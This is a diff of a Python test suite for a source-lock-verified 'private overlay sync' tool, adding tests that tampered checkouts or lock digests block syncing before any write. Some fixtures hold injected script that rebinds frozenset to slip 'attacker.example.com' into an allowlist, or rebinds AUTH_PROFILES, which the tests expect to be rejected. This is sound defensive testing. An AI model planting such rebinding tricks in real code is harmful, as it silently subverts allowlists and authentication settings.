                 "    set(values) | {'attacker.example.com'}\n"
                 ")\n\n"
             ),
-            appended_script=(
-                "\nnamespace['froze' + 'nset'] = original_frozenset\n"
-            ),
+            appended_script=("\nnamespace['froze' + 'nset'] = original_frozenset\n"),
         )
 
         with self.assertRaisesRegex(
@@ -2982,9 +4514,7 @@ class PrivateOverlaySyncTests(unittest.TestCase):
     def test_bug_triage_sync_rejects_pattern_capture_rebinding(self) -> None:
         rule, _source, _interface = self._write_current_bug_triage_source(
             appended_script=(
-                "\nmatch object():\n"
-                "    case _ as AUTH_PROFILES:\n"
-                "        pass\n"
+                "\nmatch object():\n    case _ as AUTH_PROFILES:\n        pass\n"
             )
         )
 
@@ -3671,7 +5201,15 @@ class PrivateOverlaySyncTests(unittest.TestCase):
             else (),
         )
         source_lock = SimpleNamespace(
-            pins=(SimpleNamespace(name=repository, sha="c" * 40),),
+            pins=(
+                SimpleNamespace(
+                    name=repository,
+                    repository=f"Joey-Tools/{repository}",
+                    sha="c" * 40,
+                    tree="d" * 40,
+                ),
+            ),
+            digest="e" * 64,
         )
         source_lock_error = type("SourceLockError", (RuntimeError,), {})
         verification_count = 0
@@ -3680,6 +5218,10 @@ class PrivateOverlaySyncTests(unittest.TestCase):
             nonlocal verification_count
             verification_count += 1
             self.assertEqual(payload.read_bytes(), trusted)
+            return _synthetic_complete_checkout_receipt(
+                _root,
+                _source_lock.pins,
+            )
 
         def load_locked_source_manifest(
             checkout,
@@ -3788,7 +5330,7 @@ class PrivateOverlaySyncTests(unittest.TestCase):
         self.assertFalse(copy_triggered)
         self.assertEqual(result, 0, errors.getvalue())
         self.assertEqual(payload.read_bytes(), trusted)
-        self.assertEqual(verification_count, 2)
+        self.assertEqual(verification_count, 4)
         if directory_rule:
             self.assertEqual(
                 sorted(path.name for path in target.iterdir()),
@@ -3814,29 +5356,231 @@ class PrivateOverlaySyncTests(unittest.TestCase):
     ) -> None:
         self._assert_plain_source_copy_race_fails_closed(directory_rule=True)
 
+    def _assert_prewrite_checkout_mutation_blocks_sync(
+        self,
+        mutation_kind: str,
+    ) -> None:
+        checkout = self.source_root / "prewrite-verification-repo"
+        checkout.mkdir(parents=True)
+        self._fixture_git(checkout, "init", "--quiet")
+        source = checkout / "skill"
+        source.mkdir()
+        (source / "payload.txt").write_text("trusted\n", encoding="utf-8")
+        self._fixture_git(checkout, "add", ".")
+        self._fixture_git(checkout, "commit", "--quiet", "-m", "trusted")
+        self._fixture_git(checkout, "switch", "--quiet", "--detach")
+        git_path = SOURCE_LOCK_MODULE._trusted_git_path()
+        pin = SOURCE_LOCK_MODULE._verify_checkout(
+            git_path,
+            checkout,
+            name=checkout.name,
+            repository="Joey-Tools/prewrite-verification-repo",
+            expected=None,
+        )
+        source_lock = SimpleNamespace(pins=(pin,), digest="a" * 64)
+        rule = SYNC_MODULE.SyncRule(
+            repo=pin.name,
+            source=Path("skill"),
+            target=Path("personal_codex/skills/prewrite-verification"),
+        )
+        target = self.repo_root / rule.target
+        target.mkdir(parents=True)
+        sentinel = target / "sentinel.txt"
+        sentinel.write_bytes(b"old target\n")
+        mutation_ran = False
+
+        replacement = self.root / "prewrite-verification-replacement"
+        if mutation_kind == "checkout-replacement":
+            replacement.mkdir()
+            self._fixture_git(replacement, "init", "--quiet")
+            replacement_source = replacement / "skill"
+            replacement_source.mkdir()
+            (replacement_source / "payload.txt").write_text(
+                "replacement\n",
+                encoding="utf-8",
+            )
+            self._fixture_git(replacement, "add", ".")
+            self._fixture_git(
+                replacement,
+                "commit",
+                "--quiet",
+                "-m",
+                "replacement",
+            )
+            self._fixture_git(replacement, "switch", "--quiet", "--detach")
+
+        def verify_checkouts(_source_root, _source_lock, **_kwargs):
+            self.assertIs(_source_lock, source_lock)
+            return SOURCE_LOCK_MODULE.verify_checkouts(
+                _source_root,
+                _source_lock,
+            )
+
+        def load_manifest(*args, **kwargs):
+            nonlocal mutation_ran
+            manifest = SOURCE_LOCK_MODULE.load_locked_source_manifest(
+                *args,
+                **kwargs,
+            )
+            self.assertFalse(mutation_ran)
+            if mutation_kind == "object-deletion":
+                object_path = checkout / ".git" / "objects" / pin.sha[:2] / pin.sha[2:]
+                self.assertTrue(object_path.is_file())
+                object_path.unlink()
+            elif mutation_kind == "checkout-replacement":
+                retained = checkout.with_name(f"{checkout.name}.retained")
+                checkout.rename(retained)
+                replacement.rename(checkout)
+            elif mutation_kind == "config-mutation":
+                config = checkout / ".git" / "config"
+                before = config.stat()
+                config.write_bytes(
+                    config.read_bytes() + b"\n[test-receipt]\n\tvalue = stable\n"
+                )
+                after = config.stat()
+                self.assertEqual(
+                    (before.st_dev, before.st_ino), (after.st_dev, after.st_ino)
+                )
+            mutation_ran = True
+            return manifest
+
+        def load_live_source_lock(_repo_root):
+            if mutation_ran and mutation_kind == "source-lock-mutation":
+                return SimpleNamespace(
+                    pins=source_lock.pins,
+                    digest="b" * 64,
+                )
+            return source_lock
+
+        source_lock_module = SimpleNamespace(
+            SourceLockError=SOURCE_LOCK_MODULE.SourceLockError,
+            load_source_lock=mock.Mock(side_effect=load_live_source_lock),
+            validate_base_release_binding=mock.Mock(),
+            validate_generated_provenance=mock.Mock(),
+            verify_checkouts=mock.Mock(side_effect=verify_checkouts),
+            load_locked_source_manifest=mock.Mock(side_effect=load_manifest),
+            read_locked_source_blob=SOURCE_LOCK_MODULE.read_locked_source_blob,
+        )
+        errors = io.StringIO()
+        with (
+            mock.patch.object(
+                SYNC_MODULE,
+                "_load_source_lock_module",
+                return_value=source_lock_module,
+            ),
+            mock.patch.object(SYNC_MODULE, "SYNC_RULES", (rule,)),
+            mock.patch.object(SYNC_MODULE, "sync_sources") as sync_sources,
+            contextlib.redirect_stderr(errors),
+        ):
+            result = SYNC_MODULE.main(
+                [
+                    "--repo-root",
+                    str(self.repo_root),
+                    "--source-root",
+                    str(self.source_root),
+                ]
+            )
+
+        self.assertTrue(mutation_ran)
+        self.assertEqual(result, 1, errors.getvalue())
+        self.assertEqual(
+            source_lock_module.verify_checkouts.call_count,
+            1 if mutation_kind == "source-lock-mutation" else 2,
+        )
+        sync_sources.assert_not_called()
+        self.assertEqual(sentinel.read_bytes(), b"old target\n")
+
+    def test_prewrite_verification_rejects_deleted_object_before_sync(self) -> None:
+        self._assert_prewrite_checkout_mutation_blocks_sync("object-deletion")
+
+    def test_prewrite_verification_rejects_replaced_checkout_before_sync(
+        self,
+    ) -> None:
+        self._assert_prewrite_checkout_mutation_blocks_sync("checkout-replacement")
+
+    def test_prewrite_verification_rejects_same_inode_config_mutation_before_sync(
+        self,
+    ) -> None:
+        self._assert_prewrite_checkout_mutation_blocks_sync("config-mutation")
+
+    def test_prewrite_verification_rejects_source_lock_mutation_before_sync(
+        self,
+    ) -> None:
+        self._assert_prewrite_checkout_mutation_blocks_sync("source-lock-mutation")
+
     def test_sync_main_reports_repo_recovery_and_external_retention(self) -> None:
         repo_recovery = self.repo_root / ".codex-tmp/private-overlay-recovery/run"
         external_retained = self.external_prepared_parent / ".skill.prepared.example"
         output = io.StringIO()
+        events: list[str] = []
         source_names = tuple(
             dict.fromkeys(rule.repo for rule in SYNC_MODULE.SYNC_RULES)
         )
+        policy = SYNC_MODULE.CANONICAL_REVIEW_MIGRATION_POLICY
         source_lock = SimpleNamespace(
             pins=tuple(
-                SimpleNamespace(name=name, sha=f"{index + 1:040x}")
+                SimpleNamespace(
+                    name=name,
+                    repository=(
+                        policy.repository
+                        if name == "codex-review-workflows"
+                        else f"Joey-Tools/{name}"
+                    ),
+                    sha=f"{index + 1:040x}",
+                    tree=(
+                        policy.approved_root_tree
+                        if name == "codex-review-workflows"
+                        else f"{index + 101:040x}"
+                    ),
+                )
                 for index, name in enumerate(source_names)
             ),
+            digest="f" * 64,
         )
         source_lock_error = type("SourceLockError", (RuntimeError,), {})
+
+        def record_verification(source_root, locked_source, **_kwargs):
+            events.append("verify")
+            return _synthetic_complete_checkout_receipt(
+                source_root,
+                locked_source.pins,
+            )
+
+        def record_manifest(*_args, **_kwargs):
+            events.append("manifest")
+            return object()
+
         source_lock_module = SimpleNamespace(
             SourceLockError=source_lock_error,
             load_source_lock=mock.Mock(return_value=source_lock),
             validate_base_release_binding=mock.Mock(),
             validate_generated_provenance=mock.Mock(),
-            verify_checkouts=mock.Mock(),
-            load_locked_source_manifest=mock.Mock(return_value=object()),
+            verify_checkouts=mock.Mock(side_effect=record_verification),
+            load_locked_source_manifest=mock.Mock(side_effect=record_manifest),
             read_locked_source_blob=mock.Mock(),
         )
+        migration_pin = next(
+            pin for pin in source_lock.pins if pin.name == "codex-review-workflows"
+        )
+        migration_source_pin = SYNC_MODULE._VerifiedLockedSourcePin(
+            repository=policy.repository,
+            revision=migration_pin.sha,
+            root_tree=policy.approved_root_tree,
+        )
+        migration_receipt = SYNC_MODULE._CanonicalReviewMigrationReceipt(
+            policy=policy,
+            source_pin=migration_source_pin,
+            live_review_subtree_tree=policy.approved_review_subtree_tree,
+            activation_basis="exact-approved-root-tree",
+        )
+
+        def record_receipt(*_args, **_kwargs):
+            events.append("receipt")
+            return migration_source_pin, migration_receipt
+
+        def record_sync(*_args, **_kwargs):
+            events.append("sync")
+            return repo_recovery, external_retained
 
         with (
             mock.patch.object(
@@ -3847,7 +5591,12 @@ class PrivateOverlaySyncTests(unittest.TestCase):
             mock.patch.object(
                 SYNC_MODULE,
                 "sync_sources",
-                return_value=(repo_recovery, external_retained),
+                side_effect=record_sync,
+            ),
+            mock.patch.object(
+                SYNC_MODULE,
+                "_bind_canonical_review_migration_source",
+                side_effect=record_receipt,
             ),
             contextlib.redirect_stdout(output),
         ):
@@ -3869,24 +5618,64 @@ class PrivateOverlaySyncTests(unittest.TestCase):
                 f"external prepared tree retained: {external_retained}",
             ],
         )
-        source_lock_module.load_source_lock.assert_called_once_with(self.repo_root)
+        self.assertEqual(source_lock_module.load_source_lock.call_count, 7)
+        self.assertTrue(
+            all(
+                call.args == (self.repo_root,)
+                for call in source_lock_module.load_source_lock.call_args_list
+            )
+        )
         source_lock_module.validate_base_release_binding.assert_called_once_with(
             self.repo_root,
             source_lock,
         )
-        self.assertEqual(source_lock_module.verify_checkouts.call_count, 2)
-        source_lock_module.validate_generated_provenance.assert_called_once_with(
-            self.repo_root,
-            source_lock,
-            toolbox_checkout=self.source_root / "codex-toolbox",
-            require_private_receipt=False,
+        self.assertEqual(source_lock_module.verify_checkouts.call_count, 3)
+        verification_events = [
+            index for index, event in enumerate(events) if event == "verify"
+        ]
+        self.assertEqual(len(verification_events), 3)
+        manifest_or_receipt_events = [
+            index
+            for index, event in enumerate(events)
+            if event in {"manifest", "receipt"}
+        ]
+        self.assertLess(verification_events[0], min(manifest_or_receipt_events))
+        self.assertGreater(
+            verification_events[1],
+            max(manifest_or_receipt_events),
+        )
+        self.assertLess(verification_events[1], events.index("sync"))
+        self.assertLess(events.index("sync"), verification_events[2])
+        self.assertEqual(
+            source_lock_module.validate_generated_provenance.call_args_list,
+            [
+                mock.call(
+                    self.repo_root,
+                    source_lock,
+                    toolbox_checkout=self.source_root / "codex-toolbox",
+                    require_private_receipt=False,
+                ),
+                mock.call(
+                    self.repo_root,
+                    source_lock,
+                    toolbox_checkout=self.source_root / "codex-toolbox",
+                ),
+            ],
         )
 
     def test_sync_main_preserves_lexical_source_root_for_preflight(self) -> None:
         source_link = self.root / "source-link"
         source_link.symlink_to(self.source_root, target_is_directory=True)
         source_lock = SimpleNamespace(
-            pins=(SimpleNamespace(name="codex-toolbox"),),
+            pins=(
+                SimpleNamespace(
+                    name="codex-toolbox",
+                    repository="Joey-Tools/codex-toolbox",
+                    sha="a" * 40,
+                    tree="b" * 40,
+                ),
+            ),
+            digest="c" * 64,
         )
         source_lock_error = type("SourceLockError", (RuntimeError,), {})
 
@@ -9161,15 +10950,12 @@ jobs:
         self.assertIn("\n  independent_supervisor_tests:\n", workflow)
         self.assertIn("Require hosted-runner byte reproduction", workflow)
         self.assertEqual(
-            workflow.count(
-                "Run platform reconciliation safety tests (Python 3.x)"
-            ),
+            workflow.count("Run platform reconciliation safety tests (Python 3.x)"),
             1,
         )
         self.assertEqual(
             workflow.count(
-                "if: ${{ always() && steps.setup_latest_python.outcome == "
-                "'success' }}"
+                "if: ${{ always() && steps.setup_latest_python.outcome == 'success' }}"
             ),
             1,
         )
@@ -9209,9 +10995,7 @@ jobs:
         )
         self.assertIn('test "$PLATFORM_TESTS_RESULT" = "success"', workflow)
         self.assertIn('test "$PYTHON_39_RESULT" = "success"', workflow)
-        self.assertIn(
-            'test "$INDEPENDENT_SUPERVISOR_RESULT" = "success"', workflow
-        )
+        self.assertIn('test "$INDEPENDENT_SUPERVISOR_RESULT" = "success"', workflow)
         self.assertIn(
             'test "$READONLY_INSTALL_SUPERVISOR_RESULT" = "success"', workflow
         )
@@ -9341,24 +11125,18 @@ jobs:
 
     def test_personal_agents_state_matches_review_source_transition(self) -> None:
         source_lock = json.loads(
-            (REPO_ROOT / "private-overlay-source-lock.json").read_text(
-                encoding="utf-8"
-            )
+            (REPO_ROOT / "private-overlay-source-lock.json").read_text(encoding="utf-8")
         )
         actual = SYNC_MODULE._personal_agents_review_guidance_state(
             (REPO_ROOT / SYNC_MODULE.PERSONAL_AGENTS_TARGET).read_bytes()
         )
-        expected = (
-            "legacy" if _is_legacy_review_source_pin(source_lock) else "current"
-        )
+        expected = "legacy" if _is_legacy_review_source_pin(source_lock) else "current"
         self.assertEqual(actual, expected)
 
     def test_personal_agents_delegate_workspace_contract_to_review_skill(self) -> None:
         agents = _final_personal_agents_text()
         source_lock = json.loads(
-            (REPO_ROOT / "private-overlay-source-lock.json").read_text(
-                encoding="utf-8"
-            )
+            (REPO_ROOT / "private-overlay-source-lock.json").read_text(encoding="utf-8")
         )
         review_source = next(
             source
@@ -9405,12 +11183,8 @@ jobs:
     ) -> None:
         bug_triage = REPO_ROOT / "personal_codex/skills/bug-triage-playbook"
         bug_skill = (bug_triage / "SKILL.md").read_text(encoding="utf-8")
-        bug_interface = (bug_triage / "agents/openai.yaml").read_text(
-            encoding="utf-8"
-        )
-        agents = (REPO_ROOT / "personal_codex/AGENTS.md").read_text(
-            encoding="utf-8"
-        )
+        bug_interface = (bug_triage / "agents/openai.yaml").read_text(encoding="utf-8")
+        agents = (REPO_ROOT / "personal_codex/AGENTS.md").read_text(encoding="utf-8")
         tracker = REPO_ROOT / "personal_codex/skills/cisco-trackers-lookup"
         tracker_skill = (tracker / "SKILL.md").read_text(encoding="utf-8")
         tracker_workflow = (tracker / "references/workflow.md").read_text(
@@ -9500,7 +11274,15 @@ jobs:
             "including tracked repository secrets",
             "excludes runtime secrets and credentials",
             "A bare named-review request is report-only",
-            "Exact `@codex review` on an already-existing eligible PR",
+            "scoped exact `@codex review` producer operation",
+            "single-owner, single-flight recovery after ambiguous delivery",
+            "repeating that exact POST for the same logical request",
+            "never authorizes a second logical request",
+            "GitHub Actions rerun, dispatch, or reconciliation requires both",
+            "repository-predeclared exact idempotent or reentrant contract",
+            "frozen scope and exact inputs",
+            "separate current-task delivery or readiness authorization",
+            "never authorizes a different workflow, input, scope, destination",
         ):
             with self.subTest(anchor=anchor):
                 self.assertIn(anchor, agents)
@@ -9516,6 +11298,7 @@ jobs:
             "required `independent-codex-pr-review`",
             "$external-review-playbook",
             "$copilot-review-playbook",
+            "is the only mutation implied by bare triple",
         ):
             with self.subTest(retired=retired):
                 self.assertNotIn(retired, agents)
@@ -10002,9 +11785,7 @@ jobs:
         release_body = job_body("release")
         self.assertIn("    name: Build private overlay release\n", release_body)
         self.assertIn(
-            "    needs:\n"
-            "      - controller_python_39\n"
-            "      - controller_macos\n",
+            "    needs:\n      - controller_python_39\n      - controller_macos\n",
             release_body,
         )
         self.assertIn("always() &&", release_body)
